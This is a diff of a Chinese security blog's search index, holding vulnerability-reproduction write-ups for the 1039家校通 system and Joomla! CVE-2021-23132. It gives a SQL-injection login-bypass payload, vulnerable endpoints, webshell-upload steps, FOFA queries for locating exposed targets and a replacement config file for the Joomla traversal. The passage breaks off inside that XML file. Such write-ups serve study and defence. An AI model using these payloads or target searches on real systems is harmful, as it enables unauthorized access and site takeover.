@@ -1,38 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>1039家校通SQL注入和后台GETSHELL</title>
-    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
-&#x2F;Student&#x2F;StudentLogin.aspx
-&#x2F;Teacher&#x2F;Index.aspx
-&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
-<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
-<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
-<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
-&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
-<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞挖掘</category>
-      </categories>
-      <tags>
-        <tag>2014.7</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache Flink CVE-2020-17519/17518 漏洞复现</title>
     <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
@@ -92,6 +60,500 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </tags>
   </entry>
   <entry>
+    <title>1039家校通SQL注入和后台GETSHELL</title>
+    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
+&#x2F;Student&#x2F;StudentLogin.aspx
+&#x2F;Teacher&#x2F;Index.aspx
+&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
+<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
+<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
+<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
+<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
+&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
+<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞挖掘</category>
+      </categories>
+      <tags>
+        <tag>2014.7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Joomla! CVE-2021-23132 漏洞复现</title>
+    <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
+app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。<br>本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。</p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N<br>漏洞等级：7.5 | 高危</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>3.0.0 &lt;= Joomla! &lt;= 3.9.24</p>
+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p><a href="https://github.com/HoangKien1020/CVE-2021-23132">https://github.com/HoangKien1020/CVE-2021-23132</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞复现环境在本地搭建，首先从<a href="https://downloads.joomla.org/zh-cn/">官网</a>下载安装包，我这里使用了Joomla_3.9.22模板。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>直接在php集成环境下安装即可，附上<a href="https://www.bilibili.com/video/BV1Mt411A7V4?p=7">B站链接</a>。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>Joomla！在安装过程中会提示新建超级管理员，当然，在该超级管理员权限下是可以直接getshell的，因为权限很大。<br>该漏洞是在一般普通管理员的身份下，存在网站目录下的任意文件目录遍历，而导致的远程代码执行漏洞。所以该漏洞的利用前提需要有一个普通管理员的权限。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在创建好系统后，进入后台管理，登录超级管理员用户，创建一个普通管理员用户（创建时勾选Administrator）。后面复现在该用户权限下实现目录遍历与RCE。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>首先以新创建的普通管理员身份登录系统。切换到“多媒体文件管理”。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>保存后，回到“多媒体文件管理”，可以看到这里可以操作整个web目录下的文件夹及文件。实现了目录遍历。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>然后进入到administrator/components/com_users目录下，删掉config.xml文件，并重新上传一个新的config.xml文件，其内容如下。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;config&gt;
+  &lt;fieldset 
+    name&#x3D;&quot;user_options&quot;
+    label&#x3D;&quot;COM_USERS_CONFIG_USER_OPTIONS&quot; &gt;
+    &lt;field
+      name&#x3D;&quot;allowUserRegistration&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;new_usertype&quot;
+      type&#x3D;&quot;usergrouplist&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_DESC&quot;
+      default&#x3D;&quot;2&quot;
+      checksuperusergroup&#x3D;&quot;0&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;guest_usergroup&quot;
+      type&#x3D;&quot;usergrouplist&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_DESC&quot;
+      default&#x3D;&quot;1&quot;
+      checksuperusergroup&#x3D;&quot;0&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;sendpassword&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;useractivation&quot;
+      type&#x3D;&quot;list&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_DESC&quot;
+      default&#x3D;&quot;0&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNONE&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_SELFACTIVATION&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;2&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_ADMINACTIVATION&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;mail_to_admin&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;0&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;captcha&quot;
+      type&#x3D;&quot;plugins&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_DESC&quot;
+      folder&#x3D;&quot;captcha&quot;
+      filter&#x3D;&quot;cmd&quot;
+      useglobal&#x3D;&quot;true&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JOPTION_DO_NOT_USE&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;frontend_userparams&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JSHOW&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JHIDE&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;site_language&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;0&quot;
+      showon&#x3D;&quot;frontend_userparams:1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JSHOW&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JHIDE&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;change_login_name&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;0&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+  &lt;&#x2F;fieldset&gt;
+
+  &lt;fieldset
+    name&#x3D;&quot;domain_options&quot;
+    label&#x3D;&quot;COM_USERS_CONFIG_DOMAIN_OPTIONS&quot;
+    &gt;
+
+    &lt;field
+      name&#x3D;&quot;domains&quot;
+      type&#x3D;&quot;subform&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_DOMAINS_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_DOMAINS_DESC&quot;
+      multiple&#x3D;&quot;true&quot;
+      layout&#x3D;&quot;joomla.form.field.subform.repeatable-table&quot;
+      formsource&#x3D;&quot;administrator&#x2F;components&#x2F;com_users&#x2F;models&#x2F;forms&#x2F;config_domain.xml&quot;
+    &#x2F;&gt;
+  &lt;&#x2F;fieldset&gt;
+
+  &lt;fieldset
+    name&#x3D;&quot;password_options&quot;
+    label&#x3D;&quot;COM_USERS_CONFIG_PASSWORD_OPTIONS&quot; &gt;
+    &lt;field
+      name&#x3D;&quot;reset_count&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_DESC&quot;
+      first&#x3D;&quot;0&quot;
+      last&#x3D;&quot;20&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;10&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;reset_time&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_DESC&quot;
+      first&#x3D;&quot;1&quot;
+      last&#x3D;&quot;24&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;1&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;minimum_length&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH_DESC&quot;
+      first&#x3D;&quot;4&quot;
+      last&#x3D;&quot;99&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;4&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;minimum_integers&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS_DESC&quot;
+      first&#x3D;&quot;0&quot;
+      last&#x3D;&quot;98&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;0&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;minimum_symbols&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS_DESC&quot;
+      first&#x3D;&quot;0&quot;
+      last&#x3D;&quot;98&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;0&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;minimum_uppercase&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE_DESC&quot;
+      first&#x3D;&quot;0&quot;
+      last&#x3D;&quot;98&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;0&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;minimum_lowercase&quot;
+      type&#x3D;&quot;integer&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE_DESC&quot;
+      first&#x3D;&quot;0&quot;
+      last&#x3D;&quot;98&quot;
+      step&#x3D;&quot;1&quot;
+      default&#x3D;&quot;0&quot;
+    &#x2F;&gt;
+
+  &lt;&#x2F;fieldset&gt;
+
+  &lt;fieldset
+    name&#x3D;&quot;user_notes_history&quot;
+    label&#x3D;&quot;COM_USERS_CONFIG_FIELD_NOTES_HISTORY&quot; &gt;
+
+    &lt;field
+      name&#x3D;&quot;save_history&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_LABEL&quot;
+      description&#x3D;&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;0&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
